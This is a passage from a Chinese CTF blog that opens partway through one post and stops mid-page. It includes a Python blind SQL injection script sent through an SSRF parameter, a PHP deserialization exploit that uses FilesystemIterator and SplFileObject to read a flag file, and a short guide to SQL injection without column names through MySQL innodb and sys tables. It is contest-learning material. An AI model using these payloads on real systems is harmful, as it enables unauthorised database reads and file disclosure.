class="line"></span><br><span class="line">asc_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">mydata = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;mochu7&#x27;</span>&#125; </span><br><span class="line">myfile = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;mochu7.txt&#x27;</span>,<span class="string">&#x27;mochu7&#x27;</span>)&#125;</span><br><span class="line">mycookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;jtq4q3fdfgnckcrd52a6nhf90a&#x27;</span>&#125;</span><br><span class="line">ip = <span class="string">&#x27;http://183.129.189.60:10015/?url=&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ses=requests.session()</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> asc_str:</span><br><span class="line">        payload = <span class="string">&#x27;http://localhost//se1f_Log3n.php?username=mochu\&#x27;or ascii(mid((select flag from ctf.secret),&#123;&#125;,1))=&#123;&#125;%23password=mochu7&#x27;</span>.<span class="built_in">format</span>(l,<span class="built_in">ord</span>(s))</span><br><span class="line">        url = ip + quote(payload)</span><br><span class="line">        r = ses.post(url=url, data=mydata, files=myfile, cookies=mycookie)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;correct?&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += s</span><br><span class="line">            print(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<p>得到flag</p>
<p><img src="https://i.loli.net/2021/04/08/HfSAWcwMKevJi1U.png" alt="image-20210408124649418.png"></p>
<h1 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h1><p>调用和SplFileObject内置类进行反序列化。FilesystemIterator用于遍历目录文件，SplFileObject用于读取文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure>



<p>列出目录下文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;FilesystemIterator&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;/var/www/html/&quot;</span>;</span><br><span class="line">        <span class="comment">//echo new  $this-&gt;class ($this-&gt;para);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>



<p>发现目录aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE，目录下存在flag.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;76863e29-3ca5-4471-ac1a-57b8f52336b7.machine.dasctf.com&#x2F;?pop&#x3D;O%3A1%3A%22A%22%3A3%3A&#123;s%3A5%3A%22class%22%3Bs%3A18%3A%22FilesystemIterator%22%3Bs%3A4%3A%22para%22%3Bs%3A14%3A%22%2Fvar%2Fwww%2Fhtml%2F%22%3Bs%3A5%3A%22check%22%3BN%3B&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/W1Yx7u258UhrTAH.png" alt="image-20210327164433163.png"></p>
<p>发现目录aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE，目录下存在flag.php</p>
<p>读取文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">        <span class="comment">//echo new  $this-&gt;class ($this-&gt;para);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/Zxu8s3KSEatnDbT.png" alt="image-20210408131112136.png"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/115276176">https://blog.csdn.net/mochu7777777/article/details/115276176</a></p>
<p><a target="_blank" rel="noopener" href="https://www.plasf.cn/articles/dasctf202103.html">https://www.plasf.cn/articles/dasctf202103.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115272645">https://blog.csdn.net/rfrder/article/details/115272645</a></p>
<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/29/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/MAR%20DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/">https://whoamianony.top/2021/03/29/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/MAR%20DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-05T05:38:50.000Z" title="2021-04-05T05:38:50.000Z">2021-04-05</time>发表</span><span class="level-item"><time dateTime="2021-04-05T05:41:19.414Z" title="2021-04-05T05:41:19.414Z">2021-04-05</time>更新</span><span class="level-item">3 分钟读完 (大约443个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/05/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">无列名注入总结</a></h1><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在information_schema被过滤时，无法获取到表名和列名，这时候就需要通过无列名注入来获取信息。</p>
<h1 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h1><p>无列名注入也是需要表名的，可以先通过InnoDb和sys来获取表名</p>
<h2 id="InnoDb"><a href="#InnoDb" class="headerlink" title="InnoDb"></a>InnoDb</h2><p>要求：Mysql版本&gt;5.6</p>
<p>inndb中有innodb_index_stats和innodb_table_stats两张表，这两张表中存储了数据库和其中的数据表的信息，但是没有存储列名。</p>
<p>查询表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database();</span><br></pre></td></tr></table></figure>



<h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>要求：Mysql版本&gt;5.7</p>
<p>通过查询sys.schema_table_statistics_with_buffer和sys.schema_auto_increment_columns获得表名</p>
<h3 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name)from sys.schema_auto_increment_columns where table_schema&#x3D;database();</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/05/rGXQ39aUF2iejdp.png" alt="image-20210405132743251.png"></p>
<h3 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database();</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/05/fpPjoHKAIeC1kcV.png" alt="image-20210405132837988.png"></p>
<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p>无列名注入的原理是依靠union select时产生的虚拟表来查询数据。</p>
<p>正常的表</p>
<p><img src="https://i.loli.net/2021/04/05/FDtjrXGe6RUHWP5.png" alt="image-20210405131730910.png"></p>
<p>union select产生的虚拟表，必须保证查询列数是准确的</p>
<p><img src="https://i.loli.net/2021/04/05/JpVIDu3oLfjya6z.png" alt="image-20210405131751893.png"></p>
<p>只要给虚拟表取一个别名，即可查询其中的数据，下面查询了第二列的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;2&#96; from (select 1,2,3 union select * from users)n;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/05/Y2jrt3ITfaL5MNe.png" alt="image-20210405131922758.png"></p>
<p>在反引号被过滤时还可以使用给列起别名的方式查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2 as b,3 union select * from users)n;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/05/6XKGLpoBsx4QWyR.png" alt="image-20210405132241116.png"></p>
<p>还可以使用<code>表名.列名</code>这种形式，n是我们给虚拟表起的别名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select n.2 from (select 1,2,3 union select * from users)n;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/05/1oPOW4lgibyE9rG.png" alt="image-20210405132353492.png"></p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/">上一页</a></div><div class="pagination-next"><a href="/page/3/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link is-current" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li><li><a class="pagination-link" href="/page/4/">4</a></li><li><a class="pagination-link" href="/page/5/">5</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://i.loli.net/2021/04/15/mxulK15prYAkXbI.png" alt="Sp4z"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sp4z</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">45</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-30T07:20:41.000Z">2021-05-30</time></p><p class="title"><a href="/2021/05/30/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Shiro-550反序列化漏洞分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-28T04:36:53.000Z">2021-05-28</time></p><p class="title"><a href="/2021/05/28/ESP%E5%AE%9A%E5%BE%8B%E5%92%8C%E5%8A%A8%E6%80%81%E8%84%B1UPX%E5%A3%B3/">ESP定律和动态脱UPX壳</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-23T06:38:50.000Z">2021-05-23</time></p><p class="title"><a href="/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/">Servlet学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-18T06:04:20.000Z">2021-05-18</time></p><p class="title"><a href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">CISCN2021 web部分题解</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-14T10:17:39.000Z">2021-05-14</time></p><p class="title"><a href="/2021/05/14/MRCTF2020-EzpopRevenge/">MRCTF2020-EzpopRevenge</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2021 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
